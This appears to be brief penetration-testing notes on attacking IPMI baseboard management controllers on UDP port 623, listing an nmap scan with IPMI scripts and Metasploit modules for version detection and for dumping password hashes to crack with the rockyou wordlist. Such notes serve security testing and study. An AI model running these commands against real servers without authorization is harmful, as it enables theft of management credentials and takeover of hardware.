Intelligent Platform Management Interface
Baseboard Management Controllers (BMCs)

623 UDP

nmap scan
```
sudo nmap $TARGET -Pn -sV -sU -p623 --script="banner,*ipmi*" --min-rate=3000
```

exploitation
```
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_version
setg rhosts
show options 


use auxiliary/scanner/ipmi/ipmi_dumphashes
setg PASS_FILE /usr/share/wordlists/rockyou.txt

```
